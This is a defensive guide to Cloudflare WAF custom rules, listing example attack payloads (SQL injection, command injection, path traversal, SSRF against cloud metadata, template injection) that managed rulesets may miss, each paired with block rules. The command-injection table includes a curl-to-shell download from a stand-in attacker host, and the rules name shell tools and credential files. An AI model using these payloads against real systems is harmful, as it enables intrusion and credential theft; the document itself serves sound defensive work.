# Cloudflare WAF Remediation Recommendations

## Executive Summary

This document provides remediation recommendations for attack vectors that may not be blocked by the Cloudflare OWASP Core Ruleset and Cloudflare Managed Ruleset, even when configured at maximum sensitivity. While these managed rulesets provide excellent baseline protection, certain attack patterns require **Custom WAF Rules** to fully mitigate.

**Key Finding:** Custom WAF rules complement managed rulesets and are essential for comprehensive protection.

---

## 1. SQL Injection (SQLi)

### Attack Patterns That May Bypass Managed Rules:
| Attack Type | Example Payload |
|-------------|---------|
| SQLi: Basic SQLi - OR bypass | `' OR '1'='1` |
| SQLi: SQLi with block comment | `' OR '1'='1'/*` |
| SQLi: SQLi AND condition | `1' AND '1'='1` |
| SQLi: Simple auth bypass | `admin'--` |
| SQLi: ORDER BY injection | `1' ORDER BY 1--+` |
| SQLi: GROUP BY injection | `1' GROUP BY 1--+` |
| SQLi: MSSQL shutdown | `1'; SHUTDOWN;--` |

### Cloudflare WAF Remediation:

> **Note:** Some SQLi patterns may bypass managed rulesets. Custom rules provide additional coverage.

#### Create Custom WAF Rules
Navigate to **Security → WAF → Custom Rules** and create:

```
Rule 1: Block SQL Comment Attacks
Expression: (http.request.uri.query contains "/*" and http.request.uri.query contains "*/") or 
            (http.request.uri.query contains "--" and http.request.uri.query contains "'")
Action: Block

Rule 2: Block SQL Keywords in Query Strings
Expression: lower(http.request.uri.query) contains "order by" or 
            lower(http.request.uri.query) contains "group by" or
            lower(http.request.uri.query) contains "shutdown"
Action: Block

Rule 3: Block Basic SQLi Patterns
Expression: http.request.uri.query contains "' or '" or
            http.request.uri.query contains "' and '"
Action: Block
```

#### Review Managed Ruleset Actions

**OWASP Core Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare OWASP Core Ruleset**
2. Search for rules containing "942" (SQL Injection rules)
3. Ensure action is set to **Block** or **Managed Challenge**, not **Log**

**Cloudflare Managed Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare Managed Ruleset**
2. Search for "SQLi" or "SQL Injection"
3. Review all matching rules and verify they are set to **Block**, not **Log**

---

## 2. Command Injection (CMDi)

### Attack Patterns That May Bypass Managed Rules:
| Attack Type | Example Payload |
|-------------|---------|
| CMDi: Basic command injection | `; ls -la` |
| CMDi: Pipe command injection | `\| cat /etc/passwd` |
| CMDi: Ampersand command injection | `& whoami` |
| CMDi: Backtick command injection | `` `id` `` |
| CMDi: Dollar command injection | `$(id)` |
| CMDi: AND command injection | `&& id` |
| CMDi: Ping command injection | `; ping -c 10 127.0.0.1` |
| CMDi: Curl shell download | `; curl http://attacker.com/shell.sh \| sh` |

### Cloudflare WAF Remediation:

> **Note:** Command injection characters are not fully covered by managed rulesets. Custom rules are recommended.

#### Create Custom WAF Rules
```
Rule 1: Block Shell Command Characters
Expression: http.request.uri.query contains "|" or
            http.request.uri.query contains ";" or
            http.request.uri.query contains "&&" or
            http.request.uri.query contains "`" or
            http.request.uri.query contains "$("
Action: Block

Rule 2: Block Common Shell Commands
Expression: lower(http.request.uri.query) regex "\\b(cat|ls|id|whoami|wget|curl|ping|nc|bash|sh)\\b"
Action: Block

Rule 3: Block /etc/passwd Access
Expression: http.request.uri contains "/etc/passwd" or
            http.request.uri.query contains "/etc/passwd"
Action: Block
```

#### Review Managed Ruleset Actions

**OWASP Core Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare OWASP Core Ruleset**
2. Search for rules containing "932" (Remote Command Execution rules)
3. Ensure action is set to **Block**

**Cloudflare Managed Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare Managed Ruleset**
2. Search for "Command Injection" or "RCE"
3. Review all matching rules and verify they are set to **Block**, not **Log**

---

## 3. Path Traversal / Local File Inclusion (LFI)

### Attack Patterns That May Bypass Managed Rules:
| Attack Type | Example Payload |
|-------------|---------|
| LFI: URL encoded traversal | `..%2f..%2f..%2fetc/passwd` |
| LFI: Null byte injection | `/etc/passwd%00` |
| LFI: Full URL encoded | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` |

### Cloudflare WAF Remediation:

#### A. Enable URL Normalization
1. Navigate to **Security → Settings**
2. Enable **Normalize incoming URLs** - this decodes URL encoding before WAF inspection

> **Note:** URL-encoded traversal patterns may bypass managed rulesets. Custom rules targeting encoded sequences provide additional coverage.

#### B. Create Custom WAF Rules
```
Rule 1: Block Path Traversal (Encoded)
Expression: http.request.uri contains "%2e%2e" or
            http.request.uri contains "%2f%2e%2e" or
            http.request.uri contains "..%2f" or
            http.request.uri contains "%2f.."
Action: Block

Rule 2: Block Null Byte Injection
Expression: http.request.uri contains "%00" or
            http.request.uri.query contains "%00"
Action: Block

Rule 3: Block Sensitive File Access
Expression: http.request.uri contains "/etc/" or
            http.request.uri contains "/proc/" or
            http.request.uri contains "/var/log/"
Action: Block
```

#### Review Managed Ruleset Actions

**OWASP Core Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare OWASP Core Ruleset**
2. Search for rules containing "930" (Local File Inclusion rules)
3. Ensure action is set to **Block**

**Cloudflare Managed Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare Managed Ruleset**
2. Search for "Traversal" or "LFI" or "File Inclusion"
3. Review all matching rules and verify they are set to **Block**, not **Log**

---

## 4. Server-Side Request Forgery (SSRF)

### Attack Patterns That May Bypass Managed Rules:
| Attack Type | Example Payload |
|-------------|---------|
| SSRF: Localhost SSRF | `http://localhost/admin` |
| SSRF: Loopback SSRF | `http://127.0.0.1/admin` |
| SSRF: IPv6 localhost SSRF | `http://[::1]/admin` |
| SSRF: AWS metadata SSRF | `http://169.254.169.254/latest/meta-data/` |
| SSRF: GCP metadata SSRF | `http://metadata.google.internal/` |
| SSRF: Azure metadata SSRF | `http://169.254.169.254/metadata/` |
| SSRF: Zero IP SSRF | `http://0.0.0.0/` |
| SSRF: Short loopback SSRF | `http://127.1/` |
| SSRF: Decimal IP SSRF | `http://2130706433/` (decimal for 127.0.0.1) |
| SSRF: Hex IP SSRF | `http://0x7f000001/` |
| SSRF: Dict protocol SSRF | `dict://localhost:11211/` |
| SSRF: File protocol SSRF | `file:///etc/passwd` |

### Cloudflare WAF Remediation:

#### A. Create Comprehensive SSRF Custom Rules
```
Rule 1: Block Localhost/Loopback in Parameters
Expression: lower(http.request.uri.query) contains "localhost" or
            http.request.uri.query contains "127.0.0.1" or
            http.request.uri.query contains "127.1" or
            http.request.uri.query contains "0.0.0.0" or
            http.request.uri.query contains "[::1]"
Action: Block

Rule 2: Block Cloud Metadata Endpoints
Expression: http.request.uri.query contains "169.254.169.254" or
            http.request.uri.query contains "metadata.google.internal" or
            http.request.uri.query contains "metadata/instance"
Action: Block

Rule 3: Block Alternative IP Representations
Expression: http.request.uri.query regex "http://(0x[0-9a-f]+|[0-9]{8,}|0+\\.[0-9])" or
            http.request.uri.query contains "2130706433"
Action: Block

Rule 4: Block Non-HTTP Protocols
Expression: lower(http.request.uri.query) contains "file://" or
            lower(http.request.uri.query) contains "dict://" or
            lower(http.request.uri.query) contains "gopher://" or
            lower(http.request.uri.query) contains "ftp://"
Action: Block
```

> **Note:** SSRF attacks targeting cloud metadata endpoints are not fully covered by managed rulesets. Custom rules are essential for cloud environments.

#### Review Managed Ruleset Actions

**OWASP Core Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare OWASP Core Ruleset**
2. Search for rules containing "934" (SSRF rules)
3. Ensure action is set to **Block**

**Cloudflare Managed Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare Managed Ruleset**
2. Search for "SSRF" or "Server-Side Request"
3. Review all matching rules and verify they are set to **Block**, not **Log**

---

## 5. Server-Side Template Injection (SSTI)

### Attack Patterns That May Bypass Managed Rules:
| Attack Type | Example Payload |
|-------------|---------|
| SSTI: Jinja2/Twig basic SSTI | `{{7*7}}` |
| SSTI: Generic template injection | `${7*7}` |
| SSTI: Ruby ERB injection | `<%= 7*7 %>` |
| SSTI: ERB injection | `#{7*7}` |
| SSTI: Flask config disclosure | `{{config}}` |
| SSTI: Python SSTI RCE | `{{''.__class__.__mro__[1].__subclasses__()}}` |

### Cloudflare WAF Remediation:

#### A. Create Custom SSTI Rules
```
Rule 1: Block Template Syntax
Expression: http.request.uri.query contains "{{" or
            http.request.uri.query contains "}}" or
            http.request.uri.query contains "${" or
            http.request.uri.query contains "<%"
Action: Block

Rule 2: Block Python SSTI Patterns
Expression: http.request.uri.query contains "__class__" or
            http.request.uri.query contains "__mro__" or
            http.request.uri.query contains "__subclasses__" or
            http.request.uri.query contains "__globals__"
Action: Block

Rule 3: Block Config/Settings Access
Expression: lower(http.request.uri.query) contains "{{config}}" or
            lower(http.request.uri.query) contains "{{settings}}" or
            lower(http.request.uri.query) contains "{{request}}"
Action: Block
```

#### Review Managed Ruleset Actions

**OWASP Core Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare OWASP Core Ruleset**
2. Search for rules containing "941" (XSS) - some SSTI patterns overlap
3. Ensure action is set to **Block**

**Cloudflare Managed Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare Managed Ruleset**
2. Search for "Template" or "Injection"
3. SSTI coverage in managed rulesets is limited; custom rules are the primary defense

---

## 6. Sensitive File Access

### Attack Patterns That May Bypass Managed Rules:
| Attack Type | Example Path |
|-------------|--------------|
| Apache htaccess access | `/.htaccess` |
| Shadow file access | `/etc/shadow` |
| AWS credentials access | `/.aws/credentials` |
| Environment file access | `/.env` |
| Go pprof debug access | `/debug/pprof/` |
| Apache server status | `/server-status` |
| WordPress debug log | `/wp-content/debug.log` |

### Cloudflare WAF Remediation:

#### A. Review Managed Ruleset Actions

**Cloudflare Managed Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare Managed Ruleset**
2. Search for "Sensitive" or "Config"
3. Key rules to check:
   - Rules blocking access to `.env`, `.git`, `.htaccess`
   - Rules blocking debug endpoints
4. Verify rules are set to **Block**, not **Log**

#### B. Create Custom Rules for Sensitive Paths
```
Rule 1: Block Hidden Files
Expression: http.request.uri.path contains "/." and 
            not http.request.uri.path contains "/.well-known"
Action: Block

Rule 2: Block Debug Endpoints
Expression: http.request.uri.path contains "/debug/" or
            http.request.uri.path contains "/server-status" or
            http.request.uri.path contains "/server-info"
Action: Block

Rule 3: Block Sensitive Config Files
Expression: http.request.uri.path contains ".env" or
            http.request.uri.path contains ".htaccess" or
            http.request.uri.path contains ".htpasswd" or
            http.request.uri.path contains ".git"
Action: Block
```

---

## 7. Scanner Detection

### Attack Patterns That May Bypass Managed Rules:
| Attack Type | User-Agent Pattern |
|-------------|-------------------|
| Nikto scanner | `Nikto` |
| SQLmap scanner | `sqlmap` |
| ZAP scanner | `ZAP` |
| Acunetix scanner | `Acunetix` |

### Cloudflare WAF Remediation:

#### A. Enable Bot Fight Mode
1. Navigate to **Security → Bots**
2. Enable **Bot Fight Mode** (Free) or **Super Bot Fight Mode** (Pro+)

#### B. Create Scanner Blocking Rules
```
Rule 1: Block Known Scanner User Agents
Expression: lower(http.user_agent) contains "nikto" or
            lower(http.user_agent) contains "sqlmap" or
            lower(http.user_agent) contains "acunetix" or
            lower(http.user_agent) contains "nessus" or
            lower(http.user_agent) contains "openvas" or
            lower(http.user_agent) contains "burp" or
            lower(http.user_agent) contains "zap" or
            lower(http.user_agent) contains "w3af" or
            lower(http.user_agent) contains "nmap"
Action: Block
```

#### C. Rate Limiting for Scanner Behavior
1. Navigate to **Security → WAF → Rate Limiting Rules**
2. Create a rule:
   - **If**: Requests from same IP exceed 100 requests per 10 seconds
   - **Then**: Block for 1 hour

---

## 8. CMS-Specific Attacks (WordPress, Joomla, Drupal)

### Attack Patterns That May Bypass Managed Rules:
| Attack Type | Example Path |
|-------------|------|
| WordPress SQLi | Various WP endpoints |
| phpMyAdmin access | `/phpmyadmin/` |
| Joomla admin access | `/administrator/` |
| Drupal settings access | `/sites/default/settings.php` |

### Cloudflare WAF Remediation:

#### A. Review Managed Ruleset Actions

**Cloudflare Managed Ruleset:**
1. Navigate to **Security → WAF → Managed rules → Cloudflare Managed Ruleset**
2. Search for your CMS name (WordPress, Joomla, Drupal)
3. Key rules to check:
   - WordPress-specific SQLi and RCE rules
   - Admin panel protection rules
   - PHP-specific vulnerability rules
4. Verify rules are set to **Block**, not **Log**

#### B. Block Admin Panel Access by IP
```
Rule 1: Restrict Admin Access
Expression: (http.request.uri.path contains "/wp-admin" or
             http.request.uri.path contains "/administrator" or
             http.request.uri.path contains "/phpmyadmin") and
            not ip.src in {YOUR_ADMIN_IP_LIST}
Action: Block
```

---

## Implementation Priority

| Priority | Category | Risk Level | Effort |
|----------|----------|------------|--------|
| **Critical** | Command Injection | High | Low |
| **Critical** | SSRF (Cloud Metadata) | High | Low |
| **High** | SQL Injection | High | Medium |
| **High** | Path Traversal | High | Low |
| **Medium** | SSTI | Medium | Low |
| **Medium** | Sensitive Files | Medium | Low |
| **Low** | Scanner Detection | Low | Low |

---

## Quick Implementation Checklist

### Custom WAF Rules (Priority)
These custom rules address gaps in managed rulesets:
- [ ] Create custom rule: Block SSRF cloud metadata IPs (169.254.169.254, metadata.google.internal)
- [ ] Create custom rule: Block command injection characters (`|`, `;`, `&&`, `` ` ``, `$()`)
- [ ] Create custom rule: Block template injection syntax (`{{`, `${`, `<%`)
- [ ] Create custom rule: Block SQL keywords in query strings (ORDER BY, GROUP BY, SHUTDOWN)
- [ ] Create custom rule: Block path traversal encoded sequences (`%2e%2e`, `%00`)
- [ ] Create custom rule: Block sensitive file paths (`.env`, `.htaccess`, `/debug/`)
- [ ] Create custom rule: Block known scanner User-Agents

### Managed Ruleset Review
- [ ] Review OWASP Core Ruleset rules - ensure set to Block, not Log
- [ ] Review Cloudflare Managed Ruleset rules - ensure set to Block, not Log
- [ ] Verify CMS-specific rules are enabled if applicable

### Additional Settings
- [ ] Enable URL normalization (**Security → Settings**)
- [ ] Enable Bot Fight Mode (**Security → Bots**)
- [ ] Configure rate limiting rules (**Security → WAF → Rate limiting rules**)

---

## Testing After Implementation

After implementing these recommendations, re-run the WAF tester:

```bash
python cf_waf_tester.py --targets your-domain.com --waf-only -o results_after.txt --accept-responsibility
```

Compare the results to verify improved protection.

---

## Additional Resources

- [Cloudflare WAF Documentation](https://developers.cloudflare.com/waf/)
- [Cloudflare OWASP Core Ruleset](https://developers.cloudflare.com/waf/managed-rules/reference/owasp-core-ruleset/)
- [Cloudflare Custom Rules](https://developers.cloudflare.com/waf/custom-rules/)
- [OWASP Top 10](https://owasp.org/Top10/)
